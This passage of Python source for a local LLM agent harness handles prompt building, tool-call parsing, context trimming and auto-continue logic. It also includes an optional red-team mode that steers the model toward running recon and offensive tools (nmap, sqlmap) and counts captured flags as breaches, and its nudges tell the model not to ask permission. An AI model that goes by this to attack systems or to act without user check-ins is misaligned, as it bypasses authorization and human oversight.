            ide_add.append("Multi-file: emit ```html path=index.html```, ```css path=style.css```, etc.")
        if ide_add:
            parts.append("IDE mode:\n" + "\n".join(ide_add))

    # === TOOLS (compressed format) ===
    # IDE mode now includes the tool list too — the model needs to know
    # write_file / read_file / list_directory exist for case (C) save requests.
    # The IDE prompt above pins the default behavior (bare ```html``` fence)
    # so just listing the tools doesn't trigger the wrap-everything-in-write_file
    # regression we saw before.
    if include_tools:
        tool_lines = ["tools:"]
        for name, t in _active_tools().items():
            params = t["parameters"].get("properties", {})
            sig = ",".join(f"{k}:{v.get('type','any')[:3]}" for k, v in params.items())
            tool_lines.append(f"- {name}({sig})")
        parts.append("\n".join(tool_lines))
        # CTF-tuned red-team models (e.g. RavenX-CyberAgent) narrate CTF framing
        # from training priors — "0/3 flags captured", "objective: 3 flags" —
        # even against a real target with nothing to find. Kill it: real
        # engagements have no flag count. A FLAG{...} matters only if a tool
        # result literally contains that string.
        if settings.get("red_team_enabled"):
            parts.append(
                "red-team note: real engagements are NOT CTFs. never report a flag "
                "count or progress like \"N/3\"/\"X of Y flags\"; never assume a "
                "FLAG{...} exists. a clean target = \"no exploitable findings\", not "
                "\"0 flags\". only cite a FLAG{...} if a tool result actually contains one."
            )
        if _sandbox_ready_cached():
            parts.append(
                "sandbox: an isolated Linux guest is available via sandbox_run(command, cwd?). "
                "PREFER it for two things: running offensive/recon tools (nmap, sqlmap, binwalk), "
                "and — most importantly — unpacking or analyzing UNTRUSTED files pulled back from "
                "a target (firmware images, malware samples, archives), so a booby-trapped file "
                "cannot compromise the host. The workspace is visible inside at /mnt/<drive>/... ; "
                "pass cwd as a Windows path. Ordinary host tasks still use run_powershell."
            )

    # === MEMORIES (most useful only, not all) ===
    mems = _select_memories_for_prompt()
    if mems:
        mem_lines = ["past user instructions & preferences (from your memory):"]
        for m in mems[:3]:
            tag = f"[{m.get('tags',[None])[0]}]" if m.get('tags') else ""
            mem_lines.append(f"- (id: {m.get('id', 'unknown')}) {m.get('text','')} {tag}")
        parts.append("\n".join(mem_lines))

    # === SYSTEM CONTEXT (summarized) ===
    try:
        if SYSTEM_CONTEXT_FILE.exists():
            facts = _scan_system_context()
            ctx_lines = ["context:"]
            ctx_lines.append(f"os={facts.get('os','')}")
            ctx_lines.append(f"user={facts.get('user','')}")
            folders = facts.get("folders", [])[:3]
            for f in folders:
                ctx_lines.append(f"{f['label']}={f['path']}")
            parts.append("\n".join(ctx_lines))
    except Exception:
        pass

    # === WORKSPACE (compact) ===
    ws = get_workspace().get("folders", [])
    if ws:
        parts.append("workspace:\n" + "\n".join(f"- {f}" for f in ws))
    else:
        parts.append("workspace: none (file tools will refuse)")

    # Today's date — placed LAST, not at the top. It changes daily while
    # everything before it stays byte-identical, so keeping it out of the
    # prompt's cacheable PREFIX means a new day reprefills only this short tail
    # instead of the whole static system prompt. (llama-server prompt-cache
    # reuse keys on the longest unchanged prefix; mutable content up front is
    # the classic cache killer.) Still rounds the model's time awareness up to
    # the actual day so it doesn't answer date-relative questions from its
    # training cutoff.
    parts.append(f"current date: {time.strftime('%A, %B %d, %Y')}")

    return "\n".join(parts)



def llama_options(settings: dict) -> dict:
    """Map our settings to llama-server /v1/chat/completions top-level params.
    Unlike Ollama, llama-server treats ctx size / GPU layers / batch / threads
    as server-launch flags — not per-request. We only ship per-request
    sampling/predict params here."""
    opt: dict = {}
    t = settings.get("temperature")
    opt["temperature"] = float(t) if t is not None and t != "" else 0.5
    p = settings.get("top_p")
    opt["top_p"] = float(p) if p is not None and p != "" else 0.9
    # Pass through additional sampler params if set. These prevent the model
    # from looping or producing low-diversity output.
    for key, default in (("top_k", 40), ("min_p", 0.05),
                         ("repeat_penalty", 1.1),
                         ("presence_penalty", 0.0),
                         ("frequency_penalty", 0.0)):
        v = settings.get(key)
        if v is not None and v != "":
            try:
                opt[key] = float(v)
            except (ValueError, TypeError):
                pass
    np = int(settings.get("num_predict") or -1)
    if np > 0:
        opt["max_tokens"] = np
    return opt





def _is_gemma_model(name: str | None) -> bool:
    """Gemma emits a python-shaped function-call dialect (a ```tool_code``` fence
    with `name(arg=value)`) rather than a JSON tool_call, which llama.cpp's
    NATIVE parser can't decode. We therefore run Gemma in *text-tools* mode:
    tools are described in the system prompt and parsed from content by our
    fallback (extract_tool_calls handles the tool_code shape), but we do NOT
    hand llama-server the `tools` array. See the in-app FAQ."""
    return "gemma" in (name or "").lower()


def _warmup_tool_grammar() -> None:
    """Compile llama-server's tool-call grammar BEFORE the user's first real
    turn. llama.cpp builds that grammar lazily on the first /chat/completions
    request carrying a `tools` array — and the cold generation tends to emit the
    call as plain content instead of a structured tool_calls delta. That's the
    "prints the tool call as text until you say hi first" bug: the greeting turn
    silently pays the compile cost, so only the *next* turn works. Firing a
    throwaway tools-bearing request at load time pays it up front instead.
    Best-effort and silent on failure (e.g. a template that rejects tools)."""
    try:
        s = get_settings()
        payload: dict = {
            "model": s.get("model") or "local",
            "messages": [{"role": "user", "content": "ready"}],
            "tools": tools_for_llama(),
            "tool_choice": "auto",
            "max_tokens": 8,
            "stream": False,
        }
        et = s.get("enable_thinking")
        if et is not None:
            payload["chat_template_kwargs"] = {"enable_thinking": bool(et)}
        llama_post("/v1/chat/completions", payload, timeout=120)
        print("[llama] tool-grammar warmup complete", flush=True)
    except Exception as e:
        print(f"[llama] tool-grammar warmup skipped: {e}", flush=True)


# Mid-plan stall detection. Small local models (Gemma above all) announce a
# multi-step plan, execute ONE tool call, then end the turn with "I'll now do
# B" or "Shall I continue?" — the user has to bump them with "continue" for
# every remaining step. These patterns, matched against the END of a reply in
# a turn where tools already ran, identify that stall so the loop can bump
# automatically. Negative lookaheads keep sign-offs ("I'll be here", "let me
# know") from tripping it.
_UNFINISHED_PLAN_RE = re.compile(
    r"(?:i(?:'|’)?ll\s+(?:now\s+|also\s+|then\s+)?(?!be\b|know|let|wait|stop|leave)\w+|"
    r"i\s+will\s+(?:now\s+|also\s+|then\s+)?(?!be\b|know|wait|stop)\w+|"
    r"let\s+me\s+(?!know)\w+|"
    r"i(?:'|’)?m\s+going\s+to\s+\w+|i\s+am\s+going\s+to\s+\w+|"
    r"next,?\s+(?:i(?:'|’)?ll|i\s+will|step)|"
    r"proceeding\s+(?:to|with)|moving\s+on\s+to|"
    r"the\s+next\s+step\s+is|now\s+i\s+(?:need|have|want)\s+to)",
    re.IGNORECASE,
)
_ASKS_TO_CONTINUE_RE = re.compile(
    r"(?:shall|should|may|can)\s+i\s|do\s+you\s+want\s+me\s+to|"
    r"want\s+me\s+to\s+(?:continue|proceed)|ready\s+to\s+(?:continue|proceed)",
    re.IGNORECASE,
)

# Chat turn-boundary markers. When a model fails to stop at the end of its turn
# and rolls straight into a new one (Qwen3.6 Q4 in particular emits these as
# LITERAL text instead of the special stop token, so llama-server's own stop
# never fires and it re-answers forever), these let the stream loop cut it off.
_TURN_BOUNDARY_STOPS = ["<|im_end|>", "<|im_start|>", "<|endoftext|>", "<|eot_id|>", "<|end_of_text|>"]
_TURN_BOUNDARY_RE = re.compile(
    r"<\|im_start\|>|<\|im_end\|>|<\|endoftext\|>|<\|eot_id\|>|<\|end_of_text\|>"
)

def _looks_unfinished(text: str) -> bool:
    """True when a reply reads like the model dropped out of its own plan:
    it announces further actions, trails off on a colon, or asks permission
    to continue instead of delivering a result."""
    tail = (text or "").strip()
    if not tail:
        return False
    if tail.endswith(":"):
        return True
    if tail.endswith("?") and _ASKS_TO_CONTINUE_RE.search(tail[-240:]):
        return True
    return bool(_UNFINISHED_PLAN_RE.search(tail[-400:]))


def run_chat_turn(chat_id: str, messages: list[dict], use_tools: bool, emit,
                  native_tools: bool = True):
    """
    messages: list of {role, content, [tool_calls], [tool_call_id]}
    emit(event_dict): pushes a chunk to the caller (SSE producer).
    Returns the final assistant message dict (with content fully assembled).

    use_tools     — tools are in play this turn (listed in the system prompt,
                    and content is scanned by the text fallback parser).
    native_tools  — ALSO hand llama-server the `tools` array so it can emit
                    structured tool_calls. False = text-tools mode (Gemma):
                    the model still sees/uses tools, but only via content we
                    parse ourselves, since llama.cpp can't parse Gemma's dialect.
    """
    settings = get_settings()
    model = settings.get("model") or ""
    if not model:
        emit({"type": "error", "error": "no model selected. Pick one in Settings."})
        return None

    _chat_emitters[chat_id] = emit
    cancel_ev = _register_cancel(chat_id)
    # Fresh tool-call counter for this turn. The counter is checked by
    # invoke_tool and trips when the same call repeats 4+ times — see
    # _record_tool_call / TOOL_REPEAT_LIMIT for the loop-breaker logic.
    _reset_tool_call_history()
    # Stash chat_id thread-locally so deep tool callers (e.g. _run_powershell
    # logging into cmd_history.jsonl) can tag entries with the originating
    # chat without threading the id through every function signature.
    _set_current_chat(chat_id)
    try:
        try:
            max_tool_rounds = int(settings.get("max_tool_rounds") or 120)
        except Exception:
            max_tool_rounds = 60
        max_tool_rounds = max(1, min(max_tool_rounds, 500))
        rounds = 0
        empty_retries = 0    # blank-reply-after-tools nudges used this turn
        auto_continues = 0   # mid-plan stall bumps used this turn (see _looks_unfinished)
        # Turn-level token totals. A turn can span many rounds (tool call →
        # re-inference → …); each round reports its own eval_count/prompt tokens.
        # We sum them so the PERSISTED message reflects the whole turn's cost,
        # not just the final round — otherwise reload/session cost and per-message
        # tooltips undercount every tool-heavy turn.
        turn_eval_total = 0
        turn_prompt_total = 0
        # Breach state for the red-team / cyber-range flow: a FLAG{...} captured
        # in a tool response IS confirmed access. Track distinct flags seen this
        # turn so we report each stage once and can summarize at the end.
        captured_flags: list = []
        force_no_think = False   # set when the thinking-budget enforcer aborts a runaway
        budget_retries = 0       # cap how many times we force-stop thinking per turn
        conversation = list(messages)
        # Anything appended past this index is the model's working memory
        # for THIS turn — intermediate assistant messages with tool_calls,
        # tool results, the empty-retry nudge. We hand it back to the caller
        # via `final["_appended_intermediate"]` so it can be persisted and
        # the next turn replays it (instead of the model waking up amnesic).
        _start_len = len(messages)

        while True:
            if cancel_ev.is_set():
                emit({"type": "notice", "note": "stopped by user"})
                return None
            # Use the llama-server's *actual* slot context if we can read it;
            # falling back to settings only if /props isn't reachable. Without
            # this, a settings default of 8K would make the trimmer chop a
            # conversation the server happily holds at 32K — and tool results
            # the model discovered earlier in the turn vanish from history.
            ctx_limit = _llama_props_ctx() or int(settings.get("num_ctx") or 32768)
            # Reserve headroom for the response + thinking, but CAP it: 25% of a
            # 262K window is ~65K wasted on headroom no answer needs. Capping at
            # ~16K hands that context back to the conversation on large windows
            # while staying proportional on small ones.
            reserve = max(min(int(ctx_limit * 0.25), 16000), 1024)
            # Tool spec overhead: llama-server's Jinja template inlines the
            # FULL tools array into the system message server-side. That can
            # be 6-10K tokens for our ~21 tools — invisible to us until the
            # server rejects with "exceeds context size". Use /tokenize for
            # an exact count (cached per spec) so the trimmer's budget reflects
            # what actually gets sent.
            tools_overhead = 0
            if use_tools and native_tools:
                try:
                    _tools_json = json.dumps(tools_for_llama(), ensure_ascii=False)
                    tools_overhead = _tools_spec_overhead_tokens(_tools_json)
                except Exception:
                    tools_overhead = 4096  # conservative fallback
            # Floor the messages budget at 2048 tokens — even if tools overhead
            # is huge, we still need room for at least the system + last user.
            # +768 tokens of safety margin: the tools overhead is an estimate,
            # and --no-context-shift hard-errors the whole turn if the real prompt
            # slips over ctx. A little slack keeps us under the ceiling.
            effective_reserve = min(reserve + tools_overhead + 768, ctx_limit - 2048)
            trimmed = truncate_messages(conversation, ctx_limit, reserve=effective_reserve)
            dropped = max(0, len(conversation) - len(trimmed))
            if dropped > 0:
                emit({"type": "context_trimmed", "dropped": dropped, "total": len(conversation)})

            payload = {
                "model": model or "local",
                "messages": _sanitize_messages_for_openai(trimmed),
                "stream": True,
                **llama_options(settings),
            }
            # Agentic turns need a tighter, deterministic sampling profile than
            # IDE/creative turns. The user's global sliders may be tuned for
            # design work (high temp, presence_penalty for variety) — but those
            # same values make a capable model second-guess correct tool work
            # and loop ("wait, that wasn't right"), because presence/frequency
            # penalties push it AWAY from reaffirming what it just did and a
            # loose temp/top_p lets the "reconsider" tokens win. When tools are
            # in play we clamp temperature down and zero the presence/frequency
            # penalties — matching how dedicated coding agents sample — while
            # leaving the user's settings untouched for IDE turns.
            if use_tools:
                try:
                    _t = float(payload.get("temperature", 0.4) or 0.0)
                except (ValueError, TypeError):
                    _t = 0.4
                payload["temperature"] = min(_t, 0.4)
                payload["presence_penalty"] = 0.0
                payload["frequency_penalty"] = 0.0
            # Qwen3 / reasoner-family chat_template_kwargs. llama-server forwards
            # these into the Jinja chat template: lets us toggle thinking mode
            # per-request and cap thinking tokens so the model can't spin forever.
            tpl_kwargs: dict = {}
            enable_thinking = settings.get("enable_thinking")
            if enable_thinking is not None:
                tpl_kwargs["enable_thinking"] = bool(enable_thinking)
            if force_no_think:
                # Previous round blew the thinking budget — force a direct answer
                # this round regardless of the model's default thinking mode.
                tpl_kwargs["enable_thinking"] = False
                force_no_think = False
            tb = settings.get("thinking_budget")
            try:
                tb_int = int(tb) if tb is not None else 2048
            except Exception:
                tb_int = 2048
            if tb_int >= 0:
                tpl_kwargs["thinking_budget"] = tb_int
            if tpl_kwargs:
                payload["chat_template_kwargs"] = tpl_kwargs
            # Hard turn-boundary stops. Belt-and-suspenders for models (Qwen3.6
            # Q4 seen doing this) that sail past their own end-of-turn token and
            # re-answer forever — llama-server halts server-side the instant one
            # of these literal markers appears, instead of running to n_ctx.
            payload["stop"] = list(_TURN_BOUNDARY_STOPS)
            if use_tools and native_tools:
                payload["tools"] = tools_for_llama()
                payload["tool_choice"] = "auto"

            # Open the stream. If the prompt overflows n_ctx (--no-context-shift
            # makes the server reject rather than slide the window), trim older
            # turns harder and retry instead of failing the whole turn — the
            # tools-overhead estimate above can undershoot the real inlined spec.
            resp = None
            for _ctx_attempt in range(4):
                try:
                    resp = llama_post_stream("/v1/chat/completions", payload)
                    break
                except Exception as e:
                    if _ctx_attempt < 3 and _is_ctx_overflow(e):
                        pad = max(2048, int(ctx_limit * 0.12)) * (_ctx_attempt + 1)
                        tighter = min(effective_reserve + pad, ctx_limit - 1024)
                        trimmed = truncate_messages(conversation, ctx_limit, reserve=tighter)
                        payload["messages"] = _sanitize_messages_for_openai(trimmed)
                        emit({"type": "notice",
                              "note": "prompt exceeded the context window — trimmed older turns and retrying"})
                        continue
                    if _is_ctx_overflow(e):
                        emit({"type": "error",
                              "error": ("prompt still exceeds the context window after trimming — the system "
                                        "prompt + tool specs alone are near your num_ctx. Raise num_ctx in "
                                        "Settings, or turn off some tools for this turn.")})
                    else:
                        emit({"type": "error",
                              "error": f"llama-server request failed at {LLAMA}: {e}. Is it running? "
                                       f"Start it with: llama-server -m <model.gguf> --host 127.0.0.1 --port 8080 --jinja"})
                    return None
            if resp is None:
                return None
            _set_cancel_resp(chat_id, resp)

            content_buf: list[str] = []
            tool_calls_by_index: dict[int, dict] = {}
            last_stats: dict = {}
            # llama-server with --reasoning-format deepseek splits thinking into
            # its own `reasoning_content` delta. The frontend's splitThinking()
            # only recognizes inline <think>…</think>, so we re-wrap here and
            # forward as one continuous stream.
            reasoning_open = False
            runaway_stop = False   # tripped if a turn-boundary marker leaks into the answer
            # Harness-enforced thinking budget. The model's chat template often
            # IGNORES thinking_budget (Qwen3.6 ran 48k tokens on a 2048 cap), so
            # we count reasoning chars ourselves and force-close a runaway.
            think_chars = 0
            think_overflow = False
            try:
                _think_cap = int(settings.get("thinking_budget") or 2048)
            except Exception:
                _think_cap = 2048

            try:
                for raw in resp:
                    if cancel_ev.is_set():
                        break
                    line = raw.decode("utf-8", errors="replace").rstrip("\r\n")
                    if not line:
                        continue
                    if not line.startswith("data:"):
                        continue
                    data = line[5:].strip()
                    if data == "[DONE]":
                        break
                    try:
                        obj = json.loads(data)
                    except Exception:
                        continue
                    # llama-server may emit a bare timings object after [DONE]
                    if "timings" in obj and "choices" not in obj:
                        t = obj["timings"]
                        last_stats = {
                            "eval_count": t.get("predicted_n"),
                            "eval_duration": int((t.get("predicted_ms") or 0) * 1e6),
                            "prompt_eval_count": t.get("prompt_n"),
                        }
                        continue
                    if "usage" in obj and "choices" not in obj:
                        u = obj["usage"]
                        last_stats.setdefault("eval_count", u.get("completion_tokens"))
                        last_stats.setdefault("prompt_eval_count", u.get("prompt_tokens"))
                        continue
                    choices = obj.get("choices") or []
                    if not choices:
                        continue
                    ch = choices[0]
                    delta = ch.get("delta") or ch.get("message") or {}
                    # reasoning first — wrap as <think>…</think> for the UI
                    rpiece = delta.get("reasoning_content") or delta.get("reasoning") or ""
                    if rpiece:
                        if not reasoning_open:
                            content_buf.append("<think>")
                            emit({"type": "delta", "content": "<think>"})
                            reasoning_open = True
                        content_buf.append(rpiece)
                        emit({"type": "delta", "content": rpiece})
                        # The thinking budget is a SOFT target (passed to the chat
                        # template). This harness enforcer is only a RUNAWAY guard:
                        # it fires at 2.5x the budget, so legitimate deep reasoning
                        # up to and a bit past the target is never guillotined.
                        if _think_cap > 0 and budget_retries < 2:
                            think_chars += len(rpiece)
                            if think_chars / CHARS_PER_TOKEN > _think_cap * 2.5:
                                content_buf.append("</think>")
                                emit({"type": "delta", "content": "</think>"})
                                reasoning_open = False
                                think_overflow = True
                                break
                    piece = delta.get("content") or ""
                    if piece:
                        # Runaway guard: if a turn-boundary marker slips through
                        # as content, llama-server's own stop didn't fire and the
                        # model is rolling into a fresh turn to re-answer. Keep
                        # everything before the marker and cut the stream here.
                        _b = _TURN_BOUNDARY_RE.search(piece)
                        if _b:
                            piece = piece[:_b.start()]
                            runaway_stop = True
                        if reasoning_open:
                            content_buf.append("</think>")
                            emit({"type": "delta", "content": "</think>"})
                            reasoning_open = False
                        if piece:
                            content_buf.append(piece)
                            emit({"type": "delta", "content": piece})
                        if runaway_stop:
                            break
                    # tool-call deltas come as partial fragments — `arguments`
                    # is a string that concatenates into a JSON blob across
                    # many chunks.
                    for tc in (delta.get("tool_calls") or []):
                        idx = tc.get("index", 0)
                        slot = tool_calls_by_index.setdefault(idx, {
                            "id": tc.get("id") or f"call_{idx}",
                            "name": "",
                            "arguments": "",
                        })
                        if tc.get("id"):
                            slot["id"] = tc["id"]
                        fn = tc.get("function") or {}
                        if fn.get("name"):
                            slot["name"] = fn["name"]
                        args_chunk = fn.get("arguments")
                        if args_chunk:
                            if isinstance(args_chunk, dict):
                                # non-streaming mode occasionally returns a dict directly
                                slot["arguments"] = json.dumps(args_chunk, ensure_ascii=False)
                            else:
                                slot["arguments"] += args_chunk
                    if obj.get("usage"):
                        u = obj["usage"]
                        last_stats.setdefault("eval_count", u.get("completion_tokens"))
                        last_stats.setdefault("prompt_eval_count", u.get("prompt_tokens"))
                # if the stream ended while still inside reasoning (no answer
                # tokens came), close the tag so the UI can render it cleanly.
                if reasoning_open:
                    content_buf.append("</think>")
                    emit({"type": "delta", "content": "</think>"})
                    reasoning_open = False
                if last_stats.get("eval_count") is not None:
                    emit({"type": "stats", **last_stats})
                    # Fold this round into the turn totals for persistence.
                    turn_eval_total += last_stats.get("eval_count") or 0
                    turn_prompt_total += last_stats.get("prompt_eval_count") or 0
                    global _last_prompt_tokens
                    _last_prompt_tokens = last_stats.get("prompt_eval_count") or 0
                    # Per-chat truth for the gauge + summary trigger. Once set,
                    # the cold-start tokenize estimate for this chat is moot.
                    if _last_prompt_tokens:
                        _last_prompt_tokens_by_chat[chat_id] = _last_prompt_tokens
                        _CTX_EST_CACHE.pop(chat_id, None)
            finally:
                try:
                    resp.close()
                except Exception:
                    pass
                _set_cancel_resp(chat_id, None)

            if cancel_ev.is_set():
                try:
                    emit({"type": "notice", "note": "stopped by user"})
                except Exception:
                    pass
                partial = {"role": "assistant", "content": "".join(content_buf)}
                partial["_appended_intermediate"] = list(conversation[_start_len:])
                return partial

            # Thinking-budget enforcer tripped: we force-closed a runaway <think>
            # block. Re-prompt ONCE (thinking disabled) feeding the planning tail
            # back so the model continues straight into the answer.
            if think_overflow:
                budget_retries += 1
                rounds += 1
                tail = "".join(content_buf)[-2000:]
                conversation.append({
                    "role": "user",
                    "content": (
                        "[automatic note] You reached your thinking budget. Stop thinking now and write "
                        "the COMPLETE final answer directly — full code/prose, no <think> block, no more "
                        "planning. Continue from your planning so far:\n" + tail
                    ),
                })
                emit({"type": "notice",
                      "note": f"thinking budget ({_think_cap} tok) reached — writing the answer now"})
                if rounds < max_tool_rounds:
                    force_no_think = True
                    continue
                # too many rounds — fall through and finish with whatever we have

            full_text = "".join(content_buf)

            # assemble native tool calls
            parsed_calls: list[dict] = []
            for idx in sorted(tool_calls_by_index.keys()):
                slot = tool_calls_by_index[idx]
                if not slot.get("name"):
                    continue
                args = repair_tool_args(slot.get("arguments", ""))
                parsed_calls.append({"id": slot["id"], "name": slot["name"], "arguments": args})

            # fallback: parse tool calls emitted in content (hermes/qwen/llama/mistral/named)
            if not parsed_calls and use_tools:
                for c in extract_tool_calls(full_text):
                    name = c.get("name") or c.get("tool")
                    args = c.get("arguments") or c.get("args") or {}
                    if not isinstance(args, dict):
                        args = repair_tool_args(args)
                    if name:
                        parsed_calls.append({
                            "id": f"call_{len(parsed_calls)}",
                            "name": name,
                            "arguments": args,
                        })
                
                if parsed_calls:
                    # Strip fallback tool-call blocks so they don't leak into the UI as clear text
                    full_text = re.sub(r"(?:<|&lt;|\\<)?tool_call(?:>|&gt;|\\>)?[\s\S]*?((?:<|&lt;|\\<)?/tool_call(?:>|&gt;|\\>)?|$)", "", full_text, flags=re.IGNORECASE)
                    full_text = re.sub(r"```tool_call[\s\S]*?(?:```|$)", "", full_text, flags=re.IGNORECASE)
                    # Gemma python-call fence (```tool_code``` / ```python``` that
                    # held a real call we just parsed) — drop it so the bubble
                    # doesn't show the raw call text.
                    for _nm in {c["name"] for c in parsed_calls}:
                        full_text = re.sub(
                            r"```(?:tool_code|python)[\s\S]*?" + re.escape(_nm) + r"\s*\([\s\S]*?(?:```|$)",
                            "", full_text, flags=re.IGNORECASE)
                        # bare/bracketed one-liner form of the same call
                        full_text = re.sub(
                            r"^[ \t]*\[?\s*(?:print\()?\s*" + re.escape(_nm) + r"\s*\([^\n]*\)\s*\)?\s*\]?[ \t]*$",
                            "", full_text, flags=re.IGNORECASE | re.MULTILINE)
                    full_text = re.sub(r"\[TOOL_CALLS\][\s\S]*?(?:\]|$)", "", full_text, flags=re.IGNORECASE)
                    if '"name"' in full_text or "'name'" in full_text or '"function"' in full_text or "'function'" in full_text:
                        for s, e in reversed(_find_balanced_json_objects(full_text)):
                            chunk = full_text[s:e]
                            try:
                                parsed = json.loads(chunk)
                                if isinstance(parsed, dict) and (parsed.get("name") or parsed.get("function", {}).get("name")):
                                    full_text = full_text[:s] + full_text[e:]
                            except Exception:
                                pass
                    full_text = full_text.strip()

                # diagnostic — model emitted tool-call syntax but nothing
                # parsed. Almost always a chat-template / dialect mismatch,
                # which means the rest of the reply is hallucinated narration
                # of a tool that never ran. Surface that to the UI.
                if not parsed_calls and TOOL_SYNTAX_HINT_RE.search(full_text or ""):
                    print(
                        "[tool] WARNING: model emitted tool-call syntax but "
                        "no dialect matched - likely chat-template mismatch",
                        flush=True,
                    )
                    emit({
                        "type": "tool_dialect_warning",
                        "message": (
                            "Model produced tool-call syntax that this build "
                            "couldn't parse. The reply may be a hallucination "
                            "- no tool actually ran."
                        ),
                    })

            assistant_msg = {"role": "assistant", "content": full_text}
            if parsed_calls:
                assistant_msg["tool_calls"] = [
                    {
                        "id": c["id"],
                        "type": "function",
                        "function": {
                            "name": c["name"],
                            "arguments": json.dumps(c["arguments"], ensure_ascii=False),
                        },
                    }
                    for c in parsed_calls
                ]

            if not parsed_calls or rounds >= max_tool_rounds:
                _final_text = (assistant_msg.get("content") or "").strip()
                if not _final_text and rounds > 0 and empty_retries < 2:
                    empty_retries += 1
                    conversation.append({
                        "role": "system",
                        "content": "Continue. Complete the user's request using the tool results you just received. Do not ask for permission.",
                    })
                    continue
                # Mid-plan stall: tools already ran this turn and the reply
                # announces more steps (or asks "shall I continue?") without
                # making a tool call. Small models — Gemma especially — do
                # this after every single tool result, forcing the user to
                # type "continue" per step. Bump automatically, budgeted so a
                # model that keeps narrating instead of acting still lands.
                if (_final_text and rounds > 0 and rounds < max_tool_rounds
                        and auto_continues < 3 and _looks_unfinished(_final_text)):
                    auto_continues += 1
                    conversation.append(assistant_msg)
                    _fence_hint = ("" if native_tools
                                   else " Emit the ```tool_code``` fence for the next call.")
                    conversation.append({
                        "role": "user",
                        "content": (
                            "[automatic note] You announced more steps but stopped without a tool call. "
                            "Continue NOW with the next step — make the call instead of describing it."
                            + _fence_hint +
                            " Do not ask for permission and do not restate the plan. If every step is "
                            "actually complete, write the final summary of what was done instead."
                        ),
                    })
                    emit({"type": "notice",
                          "note": f"model paused mid-plan — auto-continuing ({auto_continues}/3)"})
                    continue
                # Persist whole-turn token totals (summed across every round),
                # not just the final round — keeps the last round's timing fields
                # for tok/s display but overrides the counts with the turn totals
                # so cost/tooltips/reload accounting reflect the full turn.
                turn_stats = dict(last_stats)
                if turn_eval_total:
                    turn_stats["eval_count"] = turn_eval_total
                if turn_prompt_total:
                    turn_stats["prompt_eval_count"] = turn_prompt_total
                assistant_msg["_stats"] = turn_stats
                # Breach summary for the red-team flow: which flags were captured
                # this turn and how many stages that clears.
                if captured_flags:
                    assistant_msg["_breach"] = {
                        "flags": captured_flags,
                        "count": len(captured_flags),
                    }
                # Intermediate working memory for this turn: every tool result
                # and intermediate-assistant-with-tool-calls the loop appended.
                # The caller persists these so the next user turn replays the
                # full agentic context, not just the final bubble.
                assistant_msg["_appended_intermediate"] = list(conversation[_start_len:])
                emit({"type": "final", "message": assistant_msg})
                return assistant_msg

            conversation.append(assistant_msg)
            for call in parsed_calls:
                name = call.get("name") or ""
                args = call.get("arguments") or {}
                emit({"type": "tool_start", "name": name, "arguments": args})
                _ctx = contextvars.copy_context()
                future = _tool_executor.submit(_ctx.run, invoke_tool, name, args if isinstance(args, dict) else {})
                while not future.done():
                    try:
                        future.result(timeout=1.0)
                    except Exception:
                        pass
                    if not future.done():
                        try:
                            emit({"type": "heartbeat", "note": f"waiting for {name}…"})
                        except Exception:
                            pass
                result = future.result()
                emit({"type": "tool_result", "name": name, "result": result})
                # Breach detection: a FLAG{...} in a tool response is confirmed
                # access (cyber-range / CTF scoring). Scan the serialized result,
                # report each distinct flag once as a per-stage breach event.
                # Gated to target-touching tools only — otherwise reading a
                # pentest report (or grepping notes) that documents FLAG{...}
                # strings falsely lights the whole attack-chain rail.
                if _is_breach_capable_tool(name):
                    try:
                        for _flag in _FLAG_RE.findall(json.dumps(result, ensure_ascii=False, default=str)):
                            if _flag not in captured_flags:
                                captured_flags.append(_flag)
                                emit({"type": "breach", "stage": len(captured_flags),
                                      "flag": _flag, "via": name,
                                      "total": len(captured_flags)})
                                print(f"[breach] stage {len(captured_flags)} — {_flag} (via {name})", flush=True)
                    except Exception:
                        pass
                # analysis tools produce large structured output (string lists,
                # grep hit lists, disasm listings). Cap looser so the model can
                # actually reason over the output. Chatty tools stay tight.
                # compress_tool_result does line-aware head/tail elision on
                # known bulk fields (stdout/stderr/content/etc.) BEFORE
                # serializing, so the JSON envelope stays valid and trailing
                # diagnostics survive — char-truncating the serialized JSON
                # (the previous behavior) chopped mid-value and hid the bottom
                # of every long output, where errors usually live.
                _trunc = _tool_result_cap(name)
                conversation.append({
                    "role": "tool",
                    "tool_call_id": call.get("id") or name,
                    "name": name,
                    "content": compress_tool_result(name, result, _trunc),
                })
            rounds += 1
    except Exception as e:
        print(f"run_chat_turn interrupted: {e}")
        partial = {"role": "assistant", "content": "".join(content_buf) if 'content_buf' in locals() else ""}
        partial["_appended_intermediate"] = list(conversation[_start_len:]) if 'conversation' in locals() else []
        return partial
    finally:
        _chat_emitters.pop(chat_id, None)
        _unregister_cancel(chat_id)


# Rewrite prior assistant <think>…</think> blocks as plain-text short-term
# memory notes so they survive chat-template stripping (Qwen3, DeepSeek, etc.
# all discard prior reasoning by default — the model loses its own context).
# The wire marker stays `[scratchpad-from-earlier-turn]` so legacy chat
# histories keep rendering — the UI brand is the only thing renamed.
_PRIOR_THINK_RE = re.compile(r"<think>([\s\S]*?)</think>", re.IGNORECASE)

def _preserve_prior_thinking(text: str) -> str:
    if not text or "<think>" not in text.lower():
        return text
    def _rewrite(m: "re.Match[str]") -> str:
        body = (m.group(1) or "").strip()
        if not body:
            return ""
        # plain text the chat template can't recognize as reasoning, but the
        # model can still read. compact-ish to keep ctx in check.
        return f"[scratchpad-from-earlier-turn]\n{body}\n[/scratchpad-from-earlier-turn]"
    return _PRIOR_THINK_RE.sub(_rewrite, text)


def _sanitize_messages_for_openai(msgs: list[dict]) -> list[dict]:
    """llama-server's OpenAI endpoint is stricter about message shape than
    Ollama. Strip local-only fields (`t`, `_stats`), coerce tool messages to
    the `{role:'tool', tool_call_id, content}` shape, and ensure assistant
    tool_calls have a string `arguments` field."""
    try:
        preserve_thinking = bool(get_settings().get("preserve_prior_thinking", False))
    except Exception:
        preserve_thinking = True
    out = []
    # the LAST assistant message is "current" reasoning being authored — we
    # only rewrite think blocks for messages strictly older than the latest.
    last_assistant_idx = -1
    for i, m in enumerate(msgs):
        if m.get("role") == "assistant":
            last_assistant_idx = i
    for i, m in enumerate(msgs):
        role = m.get("role")
        if role not in ("system", "user", "assistant", "tool"):
            continue
        clean: dict = {"role": role}
        content = m.get("content", "")
        if isinstance(content, list):
            clean["content"] = content
        else:
            text_content = content or ""
            if (preserve_thinking and role == "assistant"
                    and i < last_assistant_idx and isinstance(text_content, str)):
                text_content = _preserve_prior_thinking(text_content)
            clean["content"] = text_content
        if role == "tool":
            clean["tool_call_id"] = m.get("tool_call_id") or m.get("name") or "tool"
            if m.get("name"):
                clean["name"] = m["name"]
        if role == "assistant" and m.get("tool_calls"):
